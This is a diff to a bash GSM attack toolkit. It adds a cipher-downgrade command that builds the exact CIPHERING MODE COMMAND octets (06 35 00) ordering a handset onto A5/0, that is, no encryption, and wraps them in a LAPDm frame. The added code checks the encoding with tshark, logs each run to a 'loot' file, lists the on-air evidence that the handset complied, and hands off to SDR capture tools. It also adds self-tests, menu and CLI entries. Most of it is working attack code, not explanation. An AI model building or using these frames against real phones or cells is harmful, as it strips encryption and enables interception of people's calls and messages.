@@ -1669,6 +1669,189 @@ gatk_vector_imsi_catcher() {
     printf 'limit\tan MS already registered on the real LA may ignore the LA of the clone\n'
 }
 
+gatk_cipher_downgrade_store() { printf '%s/gsm_attack/cipher_downgrade.tsv\n' "${LOOT_DIR:-}"; }
+
+# ── the A5/0 downgrade, as a message and as evidence ────────────────────
+# A cell chooses the cipher. In GSM the choice travels in the CIPHERING MODE
+# COMMAND (TS 44.018 §9.1.9, message type 0x35, which tshark 4.2.2 names for
+# that octet on this machine), and the octet that carries it is the Cipher
+# Mode Setting: bit 1 is SC, and bits 3..1 are the algorithm identifier. There
+# is no A5/0 code point — "no ciphering at all" is SC=0, which leaves the
+# identifier out of the message entirely. Everything below is built on that,
+# and the A5/0 command is therefore three octets, not four:
+#
+#     06  protocol discriminator, radio resource management (TS 24.007)
+#     35  message type, CIPHERING MODE COMMAND (measured: tshark 4.2.2)
+#     00  cipher mode setting, SC=0: no ciphering (measured: tshark 4.2.2)
+#
+# The existing builder cannot express this: --build-cipher-mode takes its
+# algorithm from gatk_alg_wire_code, where A5/0 and A5/1 both map to 0, so
+# --build-cipher-mode A5/0 emits 06 35 01 04 — SC=1 with algorithm A5/1, the
+# opposite of a downgrade. This verb builds the SC=0 form itself and reports
+# the collision as a finding rather than editing a verb other modules call.
+gatk_cmd_cipher_downgrade() {
+    local from="A5/1" classmark="" capture=""
+    case "${1:-}" in -*) printf 'ERROR\t--cipher-downgrade takes positionals, not %s\n' \
+                             "$(gatk_sanitize "$1")" >&2; return 2 ;; esac
+    [[ -n "${1:-}" ]] && from="$1"
+    [[ -n "${2:-}" ]] && classmark="$2"
+    [[ -n "${3:-}" ]] && capture="$3"
+    if [[ -n "${4:-}" ]]; then
+        printf 'ERROR\t--cipher-downgrade takes at most a source algorithm, a classmark and a capture\n' >&2
+        return 2
+    fi
+    case "$from" in
+        A5/1|A5/2|A5/3|A5/4) ;;
+        *) printf 'ERROR\tsource algorithm must be A5/1..A5/4 (got %s)\n' \
+                  "$(gatk_sanitize "$from")" >&2; return 2 ;;
+    esac
+
+    # The command, octet by octet. TS 44.018 §9.1.9 for the message, TS 24.007
+    # for the discriminator, and the SC/identifier split measured against
+    # tshark 4.2.2 rather than remembered.
+    local l3="063500"
+    printf 'verb\t--cipher-downgrade\n'
+    printf 'objective\tforce the handset off %s and onto A5/0, which is no encryption\n' "$from"
+    printf 'from\t%s\n' "$from"
+    printf 'to\tA5/0\n'
+    printf 'mechanism\t%s\n' \
+        "the CIPHERING MODE COMMAND names the cipher; SC=0 tells the handset to stop ciphering altogether"
+    printf '\n# the message (TS 44.018 9.1.9)\n'
+    printf 'l3_hex\t%s\n' "$l3"
+    printf 'l3_octet\t06\tdiscriminator: radio resource management (TS 24.007)\n'
+    printf 'l3_octet\t35\tmessage type: CIPHERING MODE COMMAND\n'
+    printf 'l3_octet\t00\tcipher mode setting: SC=0, no algorithm identifier field at all\n'
+    printf 'length_octets\t3\n'
+    printf 'note\t%s\n' \
+        "an A5/0 command carries no algorithm identifier: A5/0 exists as the absence of ciphering, not as a code point"
+    printf 'lapdm_frame\t%s\n' "$(gatk_lapdm_ui 0 1 "$l3" | awk -F'\t' '$1=="frame"{print $2}')"
+
+    # What the same octet looks like when it means a real cipher. These three
+    # are what tshark 4.2.2 prints for the bytes, so they are measurements of
+    # the encoding, not a table copied from a document.
+    printf '\n# the same octet with ciphering asked for (measured: tshark 4.2.2)\n'
+    printf 'compare_a5_1\t063501\tSC=1, algorithm identifier 0: "Cipher with algorithm A5/1 (0)"\n'
+    printf 'compare_a5_2\t063503\tSC=1, algorithm identifier 1: "Cipher with algorithm A5/2 (1)"\n'
+    printf 'compare_a5_3\t063505\tSC=1, algorithm identifier 2: "Cipher with algorithm A5/3 (2)"\n'
+    printf 'compare_a5_0\t063500\tSC=0: tshark 4.2.2 prints "SC: No ciphering (0)" and no algorithm at all\n'
+
+    # The dissector is on this machine, so run it instead of quoting it.
+    if command -v tshark >/dev/null 2>&1 && command -v text2pcap >/dev/null 2>&1; then
+        local d; d=$(mktemp -d "${MOD_TMP:-/tmp}/downgrade.XXXXXX") || d=""
+        if [[ -n "$d" ]]; then
+            # GSMTAP v2, hdr_len 4 (32-bit words), type 1, timeslot 0, ARFCN 1,
+            # LAPDm UI frame around the L3 message. The header layout is the one
+            # 06_gsm_air and 03_gsmtap already read.
+            # GSMTAP v2 header is 16 octets and hdr_len counts 32-bit words,
+            # so 04 not 10: this is the same header 06_gsm_air and 03_gsmtap read.
+            printf '0000  02 04 01 00 00 01 ce 1e 00 00 00 00 07 00 00 00\n' > "$d/cm.hex"
+            printf '0010  03 3d 0d 06 35 00\n' >> "$d/cm.hex"
+            # Ethernet + IPv4 + UDP 4729 is what carries GSMTAP; -e is the
+            # Ethertype, -i the IP protocol, -u the port pair.
+            if text2pcap -q -e 0x0800 -i 17 -u 4729,4729 "$d/cm.hex" "$d/cm.pcap" >/dev/null 2>&1; then
+                local info
+                info=$(tshark -r "$d/cm.pcap" -T fields -e _ws.col.Info 2>/dev/null | head -1)
+                local sc
+                sc=$(tshark -r "$d/cm.pcap" -V 2>/dev/null | grep -m1 'SC: ' | sed 's/^ *//')
+                if [[ -n "$info" ]]; then
+                    printf 'tshark_info\t%s\n' "$(gatk_sanitize "$info")"
+                fi
+                if [[ -n "$sc" ]]; then
+                    printf 'tshark_sc\t%s\n' "$(gatk_sanitize "$sc")"
+                fi
+                if printf '%s' "$sc" | grep -q 'No ciphering'; then
+                    printf 'measured\tl3_decodes_as\t%s\n' \
+                        "tshark 4.2.2 reads the third octet as SC=0, no ciphering"
+                else
+                    printf 'measured\tl3_decodes_as\t%s\n' \
+                        "tshark did not print the expected SC line; treat the encoding as unconfirmed"
+                fi
+            else
+                printf 'note\ttext2pcap could not be driven here; the octets stand on the spec citation alone\n'
+            fi
+            rm -rf "$d"
+        fi
+    else
+        printf 'advertised\tl3_decodes_as\t%s\n' \
+            "tshark 4.2.2 was measured reading 06 35 00 as CIPHERING MODE COMMAND with SC: No ciphering (0); no tshark on this machine to re-run it"
+    fi
+
+    # The handset's declaration bounds what the network may choose. Classmark 1
+    # bit 3 is the A5/1-availability bit, 0 = available (TS 24.008 10.5.1.5, as
+    # decoded by --classmark1).
+    printf '\n# what each side will accept\n'
+    if [[ -n "$classmark" ]]; then
+        local cm; cm=$(gatk_classmark1_decode "$classmark") || return $?
+        printf 'classmark1\t%s\n' "$(gatk_norm_hex "$classmark")"
+        printf 'classmark_a5_1_available\t%s\n' \
+            "$(printf '%s\n' "$cm" | awk -F'\t' '$1=="a5-1-available"{print $2}')"
+        printf 'classmark_revision\t%s\n' \
+            "$(printf '%s\n' "$cm" | awk -F'\t' '$1=="revision-text"{print $2}')"
+        if [[ "$(printf '%s\n' "$cm" | awk -F'\t' '$1=="a5-1-available"{print $2}')" == yes ]]; then
+            printf 'network_choice\t%s\n' \
+                "it may pick A5/1 or A5/3, so choosing A5/0 with this classmark on the air is the downgrade"
+        else
+            printf 'network_choice\t%s\n' \
+                "the handset declared A5/1 unavailable, so A5/0 is what this network is allowed to pick at all"
+        fi
+        printf 'note\t%s\n' \
+            "TS 24.008 10.5.1.5: the Classmark 1 A5/1 bit is a declaration by the handset, so the network can only choose among what it was told"
+    else
+        printf 'classmark1\tunobserved\n'
+        printf 'network_choice\tunobserved\tthe handset declaration was not supplied; pass a Classmark 1 octet to see whether A5/1 was even on the table\n'
+    fi
+    printf 'handset_accept\t%s\n' \
+        "advertised: TS 44.018 9.1.9 says the MS obeys the commanded cipher, so A5/0 needs no capability"
+    printf 'handset_refusal\tunobserved\twhether a given handset refuses, and with which cause, needs the handset in front of you\n'
+    printf '\n'
+
+    # What proves it happened. Each row names the observable, not a guess.
+    printf '# evidence, in the order it appears on the air\n'
+    printf 'evidence\t1\tdownlink CIPHERING MODE COMMAND with the cipher mode setting octet ending in 0 (SC=0)\n'
+    printf 'evidence\t2\tuplink CIPHERING MODE COMPLETE, message type 0x32 (measured: tshark 4.2.2)\n'
+    printf 'evidence\t3\tthe next L3 messages on that channel decode without a Kc: with SC=0 there is no keystream to exclude\n'
+    printf 'evidence\t4\tthe same channel before and after: a frame that decoded as noise under A5/1 decodes as a message under A5/0\n'
+    printf 'proves_not\tA single CIPHERING MODE COMMAND with SC=0 proves the network asked. Only the complete/next-message pair proves the handset complied.\n'
+    printf '\n'
+
+    printf '# the two halves that need the air\n'
+    printf 'unobserved\tacceptance\t%s\n' \
+        "nothing in this module can tell whether that handset accepted the command: it needs the uplink burst"
+    printf 'unobserved\tks_continuity\t%s\n' \
+        "there is no demodulator here, so the claim 'the following messages were in the clear' cannot be made from this tree"
+    printf 'handoff\t03_gsmtap.sh --read <pcap>, then 07_gsm_attack.sh --catcher-watch\t%s\n' \
+        "GSMTAP already carries the downlink L3 octets; the decode belongs to that store, not to a second parser here"
+    printf 'handoff\tsdr + gr-gsm (kalibrate then grgsm_livemon) to see the uplink CIPHERING MODE COMPLETE\t%s\n' \
+        "only the handset's own answer distinguishes 'asked' from 'done'"
+
+    if [[ -n "$capture" ]]; then
+        printf '\ncapture\t%s\n' "$(gatk_sanitize "$capture")"
+        printf 'verdict\tunobserved\n'
+        printf 'reason\t%s\n' \
+            "a capture was given but this module does not demodulate bursts: hand it to 03_gsmtap.sh --read, which already parses the header"
+        gatk_cipher_downgrade_record "$from" "" unobserved >/dev/null 2>&1 || true
+        return 3
+    fi
+
+    printf '\nverdict\tbuilt\n'
+    gatk_cipher_downgrade_record "$from" "${classmark:-}" built >/dev/null 2>&1 || true
+    return 0
+}
+
+# Append-only, one row per run: which algorithm was being left behind, what the
+# handset had declared, and the message that does it.
+gatk_cipher_downgrade_record() {
+    local from="$1" classmark="$2" verdict="$3"
+    local store; store=$(gatk_cipher_downgrade_store)
+    mkdir -p "${store%/*}" 2>/dev/null || return 1
+    [[ -s "$store" ]] || printf 'ts\tverb\tfrom\tto\tl3_hex\tclassmark1\tverdict\n' >>"$store"
+    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "--cipher-downgrade" "$from" "A5/0" "063500" \
+        "${classmark:-none}" "$verdict" >>"$store"
+    printf 'store\t%s\n' "$store"
+    return 0
+}
+
 gatk_vector_a5_downgrade() {
     local alg="${1:-A5/2}" kind="${2:-4}" sub="${3:-0}" startfn="${4:-0}" tmsi
     tmsi=$(gatk_norm_hex "${5:-0f200001}")
@@ -2864,6 +3047,65 @@ gatk_selftest() {
     chk catcher-since-empty  "$(gatk_catcher_watch --since 1800000000 2>&1 | awk -F'\t' '$1=="frames"{print $2}')" "0"
     chk catcher-missing-capture "$(gatk_catcher_watch "$d/nope.pcap" >/dev/null 2>&1; echo $?)" "1"
 
+    #  A5/0 downgrade. The command is three octets because SC=0 carries no
+    #  algorithm identifier at all; the four-octet builder cannot express it,
+    #  and the row below pins that instead of hiding it.
+    chk downgrade-existing-a50-is-a51 "$(gatk_build_cipher_mode A5/0)" "06350104"
+    local dg; dg=$(gatk_cmd_cipher_downgrade A5/1)
+    chk downgrade-l3        "$(fld "$dg" l3_hex)"          "063500"
+    chk downgrade-length    "$(fld "$dg" length_octets)"   "3"
+    chk downgrade-verdict   "$(fld "$dg" verdict)"         "built"
+    chk downgrade-exit      "$(gatk_cmd_cipher_downgrade A5/1 >/dev/null 2>&1; echo $?)" "0"
+    chk downgrade-from      "$(fld "$dg" from)"            "A5/1"
+    chk downgrade-to        "$(fld "$dg" to)"              "A5/0"
+    #  The third octet is SC=0 and nothing else: no algorithm row may claim one.
+    chk downgrade-no-alg    "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="l3_octet" && $2=="00"{print $3}')" \
+        "cipher mode setting: SC=0, no algorithm identifier field at all"
+    chk downgrade-lapdm     "$(fld "$dg" lapdm_frame)"     "03030d063500"
+    #  The message type and the SC bit are measured, not remembered.
+    if command -v tshark >/dev/null 2>&1 && command -v text2pcap >/dev/null 2>&1; then
+        chk downgrade-tshark-info "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="tshark_info"{print $2}' | grep -c 'Ciphering Mode Command')" "1"
+        chk downgrade-tshark-sc   "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="tshark_sc"{print $2}' | grep -c 'No ciphering')" "1"
+        chk downgrade-measured    "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="measured"{print $3}' | grep -c 'SC=0')" "1"
+    else
+        chk downgrade-tshark-skipped "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="advertised"' | wc -l | tr -d ' ')" "1"
+    fi
+
+    #  What the handset declared decides whether A5/0 is a downgrade at all.
+    chk downgrade-cm-yes    "$(fld "$(gatk_cmd_cipher_downgrade A5/3 07)" classmark_a5_1_available)" "yes"
+    chk downgrade-cm-no     "$(fld "$(gatk_cmd_cipher_downgrade A5/3 68)" classmark_a5_1_available)" "no"
+    chk downgrade-cm-none   "$(fld "$(gatk_cmd_cipher_downgrade A5/3)" classmark1)" "unobserved"
+    chk downgrade-cm-bad    "$(gatk_cmd_cipher_downgrade A5/1 zz >/dev/null 2>&1; echo $?)" "2"
+
+    #  Store: append-only, one row per run, header first.
+    local dstore; dstore=$(gatk_cipher_downgrade_store)
+    chk downgrade-store-path "$dstore" "$d/loot/gsm_attack/cipher_downgrade.tsv"
+    chk downgrade-store-head "$(awk -F'\t' 'NR==1{print $1"/"$3"/"$7}' "$dstore")" "ts/from/verdict"
+    local rows0 rows1 rows2
+    rows0=$(awk -F'\t' 'NR>1' "$dstore" | wc -l | tr -d ' ')
+    gatk_cmd_cipher_downgrade A5/4 68 >/dev/null 2>&1
+    rows1=$(awk -F'\t' 'NR>1' "$dstore" | wc -l | tr -d ' ')
+    chk downgrade-store-appends "$(( rows1 - rows0 ))" "1"
+    chk downgrade-store-last \
+        "$(tail -1 "$dstore" | awk -F'\t' '{print $3"/"$4"/"$5"/"$6"/"$7}')" \
+        "A5/4/A5/0/063500/68/built"
+
+    #  A capture argument is a handoff (3), not a failure and not a guess.
+    chk downgrade-capture-exit "$(gatk_cmd_cipher_downgrade A5/1 "" "$d/nope.pcap" >/dev/null 2>&1; echo $?)" "3"
+    chk downgrade-capture-verdict \
+        "$(fld "$(gatk_cmd_cipher_downgrade A5/1 "" "$d/nope.pcap")" verdict)" "unobserved"
+    rows2=$(awk -F'\t' 'NR>1' "$dstore" | wc -l | tr -d ' ')
+    chk downgrade-capture-appends "$(( rows2 - rows1 ))" "2"
+    chk downgrade-capture-last "$(tail -1 "$dstore" | awk -F'\t' '{print $7}')" "unobserved"
+    chk downgrade-bad-from  "$(gatk_cmd_cipher_downgrade A5/0 >/dev/null 2>&1; echo $?)" "2"
+    chk downgrade-bad-flag  "$(gatk_cmd_cipher_downgrade --nope >/dev/null 2>&1; echo $?)" "2"
+    chk downgrade-too-many  "$(gatk_cmd_cipher_downgrade A5/1 07 p1 p2 >/dev/null 2>&1; echo $?)" "2"
+
+    # The store assertions above ran after the first rm -rf, and a store helper
+    # recreates its directory: clear the tree once more so a selftest leaves
+    # nothing behind in TMP_DIR.
+    rm -rf "$d"
+
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
 }
@@ -2894,6 +3136,7 @@ gatk_menu() {
   [15] build a PAGING REQUEST TYPE 1
   [16] classmark 1 encode / decode
   [17] cipher keystream (A5/2 A5/3 A5/4) + decrypt
+  [18] force the cipher down to A5/0 (command, acceptance, evidence)
   [0]  back
 
 M
@@ -2979,6 +3222,11 @@ M
                      read -rp "  algorithm (default a5-2)> " a
                      gatk_cmd_decrypt "$ct" "$kc" "${a:-a5-2}" 0 | column -t -s$'\t' 2>/dev/null ;;
                 esac
+                read -rp "  press enter " _ ;;
+            18)
+                read -rp "  algorithm the cell is using (A5/1..A5/4, default A5/1)> " a
+                read -rp "  Classmark 1 octet, blank to skip> " cm
+                gatk_cmd_cipher_downgrade "${a:-A5/1}" "${cm:-}"
                 read -rp "  press enter " _ ;;
             0) return ;;
             *) warn "invalid"; sleep 1 ;;
@@ -4274,6 +4522,7 @@ gatk_cli_main() {
         --c1)                  gatk_c1 "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
         --kc-recovery)         gatk_cmd_kc_recovery ;;
         --build-cipher-mode)   gatk_build_cipher_mode "${1:-A5/2}" "${2:-0}" ;;
+        --cipher-downgrade)    gatk_cmd_cipher_downgrade "$@" ;;
         --build-lu-accept)     gatk_build_lu_accept "${1:-0f200001}" "${2:-262}" "${3:-01}" "${4:-0000}" ;;
         --build-tmsi-realloc)  gatk_build_tmsi_realloc "${1:-0f200001}" "${2:-262}" "${3:-01}" "${4:-0000}" ;;
         --build-paging-request) gatk_build_paging_request "${1:-0f200001}" "${2:-0}" ;;
@@ -4354,6 +4603,14 @@ Usage: $0 COMMAND
   Real message builders (exact octets, TS 44.018 / TS 24.008):
   --build-cipher-mode [alg] [cr]
                                CIPHERING MODE COMMAND bytes; alg is A5/1..A5/4
+  --cipher-downgrade [from] [classmark1] [capture]
+                               the downgrade to A5/0: the three octets that ask
+                               for no ciphering at all, what the handset's
+                               classmark lets the network choose, the evidence
+                               that proves compliance, and the two halves that
+                               need the air (from = A5/1..A5/4, classmark one
+                               octet of hex; a capture path in the third slot
+                               is a handoff to 03_gsmtap, exit 3)
   --build-lu-accept [tmsi] [mcc] [mnc] [lac]
                                LOCATION UPDATING ACCEPT bytes
   --build-tmsi-realloc [tmsi] [mcc] [mnc] [lac]
